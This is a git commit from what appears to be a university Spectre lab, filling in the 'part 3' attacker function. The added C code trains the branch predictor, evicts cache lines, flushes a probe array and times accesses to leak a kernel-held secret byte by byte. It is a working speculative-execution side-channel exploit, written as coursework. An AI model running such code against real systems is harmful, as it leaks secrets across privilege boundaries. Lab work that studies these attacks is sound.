529fbc118a76d7cc48e9be86eb412b272b2265d0
Andrew Voytek Zmijewski <andrewvz@burnsville.cs.unc.edu>
2026-04-07 17:16:47 -0400

    part 3

--- lab-spectre/part3-src/attacker-part3.c
+++ lab-spectre/part3-src/attacker-part3.c
@@ -7,6 +7,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <immintrin.h>
 
 #include "labspectre.h"
 #include "labspectreipc.h"
@@ -42,11 +43,41 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
     printf("Launching attacker\n");
 
+    uint8_t *evict_buf; 
+    evict_buf = malloc(11*16384*8*sizeof(uint64_t));
+    for(size_t i = 0; i < 11*16384*8*sizeof(uint64_t); i+=4096) {
+	evict_buf[i] = 1;
+    }
+
+
+
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
 
         // [Part 3]- Fill this in!
         // leaked_byte = ??
+        
+	for(int i = 0; i < 1000; i++) {
+                call_kernel_part3(kernel_fd, shared_memory, 1);
+        }
+	for(int i = 0; i < 3; i++) {
+		for(size_t a = 0; a < 11*16384*8*sizeof(uint64_t); a += 4096) {
+			evict_buf[a] ^= 1;
+		}
+	}
+                for(int i = 0; i < 256; i++) {
+                clflush(&shared_memory[i*4096]);
+        }
+     
+		call_kernel_part3(kernel_fd, shared_memory, current_offset);
+
+        for(int i = 0; i < 256; i++) {
+                volatile uint64_t time = time_access((void*)&shared_memory[i*4096]);
+                if(time < 180) {
+                        printf("%d, %ld, %ld\n", i, time, current_offset);
+                        leaked_byte = i;
+                }
+        }
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
